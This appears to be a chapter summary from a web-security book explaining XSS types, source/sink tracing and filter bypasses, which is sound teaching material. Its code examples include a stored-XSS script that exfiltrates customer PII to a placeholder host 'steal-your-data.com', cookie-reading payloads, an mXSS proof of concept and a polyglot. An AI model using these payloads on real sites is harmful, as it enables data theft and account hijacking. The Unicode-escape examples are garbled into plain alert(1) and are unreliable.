# Chapter 25: Cross-Site Scripting

## Core Idea
XSS exploits a web application's habit of treating attacker-controlled text as executable DOM/script, and it comes in three flavors — stored, reflected, DOM-based — plus an emerging fourth, mutation-based (mXSS), that mutates a filter-safe payload into an unsafe one only after it reaches the browser's real rendering context.

## Frameworks Introduced
- **The Big Three XSS Categories** (OWASP-designated most common vectors):
  - **Stored**: payload is saved server-side (database) before execution.
  - **Reflected**: payload is not stored, but echoed back by the server in the same response/request cycle.
  - **DOM-based**: payload is both stored and executed entirely in the browser DOM, no server round-trip required.
  - When to use: classify any found XSS by *where the payload lives* and *whether a server persists it* — this determines detectability and blast radius.
- **Source + Sink Model** (required for DOM XSS): a *source* is a DOM location that can hold attacker text (e.g., `window.location.hash`); a *sink* is a DOM API that will execute that text as code (e.g., `document.write()`). Both must be present and connected for DOM XSS to fire.
  - How: to test, first enumerate sources reachable in the URL/DOM, then trace whether any code path feeds that value into a sink without sanitization.

## Key Concepts
- **Stored XSS**: attack payload persisted in the application's database; later served to any user who requests the record, so it can hit many victims from one injection and is comparatively easy to detect via server-side scanning.
- **Reflected XSS**: payload sent by the client (often via URL query params) and immediately reflected into the response HTML without persistence; harder to detect (no database trace) but usually needs social engineering (a crafted link) to distribute.
- **DOM-based XSS**: execution occurs purely client-side using a source/sink pair; invisible to static analysis and server-side scanners since no server request carries the malicious execution.
- **Client-side XSS**: proposed broader category subsuming DOM XSS, since DOM XSS never touches a server.
- **Mutation-based XSS (mXSS)**: coined by Mario Heiderich ("mXSS Attacks: Attacking Well-Secured Web-Applications by Using innerHTML Mutations"); a payload that is inert/safe in the sanitizer's parsing context but the browser's DOM optimizer transforms it into a live, executable payload after it clears sanitization.
- **XSS sink**: any browser API capable of executing a string as script (`eval()`, `innerHTML`, `document.write()`, etc.).
- **XSS source**: any browser location that can hold attacker-influenced text destined for a sink (`window.location.hash`, `document.referrer`, etc.).
- **Polyglot payload**: a single XSS string engineered to execute correctly across many different injection contexts (quoted attribute, unquoted attribute, HTML comment, JS string, etc.), eliminating the need to hand-craft a payload per context.
- **Protocol-Relative URL (PRURL)**: a URL omitting `http:`/`https:` (starts with `//`) so the browser chooses the scheme at load time; a legacy anti-pattern that filters written to match literal `http`/`https` strings miss.

## Mental Models
- Think of stored XSS as "landmine in the database" — planted once, detonates on every future read; think of reflected XSS as "a thrown grenade" — must be delivered fresh each time via a crafted link, no persistence.
- Use the source→sink trace whenever a bug report says "DOM XSS" — if you can't name both the source and the sink, you haven't actually confirmed the vulnerability.
- Treat client-side sanitizers (DOMPurify, AntiSamy, Caja) as evaluating a *different parsing context* than the final render — mXSS lives exactly in that gap, so "passed the sanitizer" is not equivalent to "safe when rendered."
- When hunting for exploitable strings, prefer polyglot payloads for triage (fast, context-agnostic) and only craft bespoke per-context payloads once a specific sink is confirmed.

## Anti-patterns
- **Regex/keyword filtering for `<script>` tags only**: a single CSP rule or regex ban on script tags stops the naive case but is trivially bypassed by non-script sinks (`onerror`, `onmouseover`, `javascript:` URIs, self-closing/malformed tags).
- **Trusting a client-side sanitizer's verdict as final**: DOMPurify, AntiSamy, and Google Caja have all been bypassed via mXSS because the sanitizer's `<template>`-based parsing context differs from the eventual render context.
- **Assuming DOM XSS is caught by static analysis or scanners**: because DOM XSS never touches the server, static analysis and most automated scanners cannot see it at all.
- **Assuming payloads must be valid, complete JavaScript**: stored XSS payloads can be malformed tags, encoded (base64/Unicode), or split across multiple stored locations and only become dangerous when concatenated client-side.

## Code Examples
```html
<!-- 1. Probe payload used to discover the mega-bank.com support-portal stored XSS -->
<strong>Please improve your web application.</strong>

<!-- 2. PII-scraping stored XSS payload (exfiltrates customer data via XHR) -->
<script>
const customers = document.querySelectorAll('.openCases');
const customerData = [];
customers.forEach((customer) => {
  customerData.push({
    firstName: customer.querySelector('.firstName').innerText,
    lastName: customer.querySelector('.lastName').innerText,
    email: customer.querySelector('.email').innerText,
    phone: customer.querySelector('.phone').innerText
  });
});
const http = new XMLHttpRequest();
http.open('POST', 'https://steal-your-data.com/data', true);
http.setRequestHeader('Content-type', 'application/json');
http.send(JSON.stringify(customerData));
</script>

<!-- 3. Reflected XSS via search query param -->
support.mega-bank.com/search?query=open+<script>alert(test);</script>checking+account

<!-- 4. DOM XSS: source = window.location.hash, sink = document.write() -->
<!-- vulnerable code on the page: -->
<!--   const hash = document.location.hash;
        const nMatches = findNumberOfMatches(funds, hash);
        document.write(nMatches + ' matches found for ' + hash); -->
investors.mega-bank.com/listing#<script>alert(document.cookie);</script>

<!-- 5. mXSS PoC against Google Closure/DOMPurify (Masato Kinugawa, 2019) -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- 6. Malformed <a> tags that Chrome auto-corrects into working handlers -->
<a onmouseover="alert(document.cookie)"\>xxs</a>
<a onmouseover=alert(document.cookie)\>xxs</a>

<!-- 7. Unicode-encoded alert(1), bypassing literal-string filters -->
alert(1)                          // substituting the "a"
alert(1)                          // substituting the "l"
alert(1)      // substituting all characters

<!-- 8. 0xSobky polyglot (2018) — executes across a dozen+ contexts -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/**/oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```
- **What it demonstrates**: probing (1) confirms unsanitized markup injection; the PII scraper (2) shows stored XSS as full data-exfiltration RCE-adjacent risk; reflected (3) shows URL-carried, non-persisted attack; DOM XSS (4) shows a pure source/sink chain requiring no server; mXSS (5) shows a sanitizer-safe string that a real DOM render turns malicious; malformed tags (6) and Unicode escapes (7) show browser auto-correction and encoding as filter-evasion primitives; the polyglot (8) shows one payload spanning many injection contexts.

## Reference Tables
| Bypass Category | Mechanism | Example |
|---|---|---|
| Self-Closing Tags | Browsers auto-close unterminated tags, so filters matching paired open/close tags miss the reformed tag | An unclosed `<script>` (or similar tag) that filtration treats as incomplete/harmless but the browser regenerates and executes |
| Protocol-Relative URLs | Omitting `http:`/`https:` (`//host`) lets the browser pick a scheme at load time, evading filters that match literal protocol strings | `<a href="//evil-website.com">click</a>` — not filtered |
| Malformed Tags | Browsers "fix" broken quote placement/count in tags before rendering; filters run pre-fix and miss the eventual valid handler | `<a onmouseover="alert(document.cookie)"\>xxs</a>` — Chrome restores this to a working `onmouseover` handler |
| Encoding Escapes | Unicode (`\uXXXX`) or other valid-but-alternate character encodings pass static string matching but the JS interpreter still executes them | `alert(1)` evaluates to `alert(1)` |
| Polyglot Payloads | A single payload string crafted to be syntactically valid script across many different injection contexts (attributes, comments, JS strings, HTML tags) at once | 0xSobky's 2018 polyglot (see Code Examples #8), valid in 12+ contexts |

## Worked Example
A disgruntled mega-bank.com customer files a complaint via support.mega-bank.com's comment form. Wanting to bold a phrase, they submit raw HTML: `<strong>Please improve your web application.</strong>`. The rendered reply shows the text bolded — proof the server stores the comment and later injects it via `div.innerHTML = comment` rather than treating it as plain text, i.e., `user submits comment -> stored in DB -> requested via HTTP -> injected into page -> interpreted as DOM rather than text`. Escalating, the "customer" instead submits a comment containing a `<script>` block that runs `document.querySelectorAll('.openCases')` to harvest first/last name, email, and phone for every open case visible to a support rep, packages it as JSON, and POSTs it via `XMLHttpRequest` to `https://steal-your-data.com/data`. Because the payload sits inside a `<script>` tag, the rep sees only literal comment text — the exfiltration runs invisibly the moment any rep (or additional rep) opens the ticket, since the script is stored and reused on every view. This is a textbook stored XSS: architecturally trivial (an `innerHTML` assignment on unsanitized user input), but capable of full PII exfiltration and, because it is database-persisted, capable of hitting every privileged viewer of that ticket.

## Key Takeaways
1. Classify every XSS finding by persistence and location (stored/reflected/DOM) first — it determines both detection strategy and how many users are exposed.
2. Never assign raw user input to `innerHTML`/`document.write()`/similar sinks without sanitization — this single pattern underlies the stored, reflected, and DOM examples in this chapter.
3. DOM-based XSS requires proving both a source and a sink; a dangerous source alone (e.g., `location.hash`) is inert without a sink consuming it unsanitized.
4. A payload passing a client-side sanitizer is not proof of safety — mXSS shows the sanitizer's parse context (e.g., inside a `<template>`) can differ from the real render context, letting `<noscript><p title="</noscript><img src=x onerror=alert(1)">` slip through DOMPurify-class tools.
5. Filter-bypass techniques (self-closing tags, PRURLs, malformed tags, Unicode escapes, polyglots) all exploit the gap between what a filter's static parser sees and what the browser's forgiving, auto-correcting renderer actually executes.
6. Stored XSS is comparatively easy to catch (scan the database for suspicious payloads); reflected and DOM-based XSS are not stored server-side and can go undetected far longer.
7. Keep a working list of sinks (`eval()`, `innerHTML`, `outerHTML`, `document.write()`, `Function()`, `setTimeout()`, `document.location`, etc.) and sources (`window.location.hash`, `window.location.search`, `document.referrer`, `window.name`, `localStorage`, etc.) as a standing checklist when auditing client-side code for XSS.

## Connects To
- **Defending Against XSS chapter**: this attack chapter's countermeasures (CSP, output encoding, DOMPurify-style sanitization, avoiding raw `innerHTML`) are covered in the later "Defending Against XSS" chapter.
- **Same-Origin Policy / cookies and session tokens**: XSS is the practical mechanism for stealing session cookies and hijacking accounts across origin boundaries.
- **Content Security Policy (CSP)**: mentioned as a mitigation that can block inline script execution and thwart naive stored/reflected script-tag payloads.
- **Remote Code Execution (RCE)**: stored payloads evaluated server-side (e.g., in Node.js contexts) escalate from XSS into RCE.
